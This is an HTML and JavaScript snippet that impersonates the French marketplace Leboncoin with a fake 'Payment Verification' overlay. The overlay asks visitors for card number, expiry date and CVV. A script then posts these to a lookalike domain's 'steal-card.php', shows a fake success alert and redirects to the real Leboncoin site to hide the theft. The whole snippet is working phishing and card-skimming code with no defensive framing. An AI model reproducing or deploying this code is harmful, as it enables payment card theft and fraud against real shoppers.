<div id="fake-payment-modal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9999;">
    <div style="background: white; margin: 10% auto; padding: 20px; width: 400px;">
        <h3>Leboncoin - Payment Verification</h3>
        <p>Please re-enter your card details for security purposes.</p>
        <form id="fake-payment-form">
            <input type="text" name="card_number" placeholder="Card Number" required>
            <input type="text" name="expiry" placeholder="MM/YY" required>
            <input type="text" name="cvv" placeholder="CVV" required>
            <button type="submit">Submit Payment</button>
        </form>
    </div>
</div>

<script>
    document.getElementById('fake-payment-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const cardData = {
            number: this.card_number.value,
            expiry: this.expiry.value,
            cvv: this.cvv.value
        };
        fetch('https://leboncoin-secure.fr/steal-card.php', {
            method: 'POST',
            body: JSON.stringify(cardData),
            headers: { 'Content-Type': 'application/json' }
        }).then(() => {
            alert("Payment successful! Redirecting...");
            window.location.href = "https://www.leboncoin.fr/mes-annonces";
        });
    });
</script>
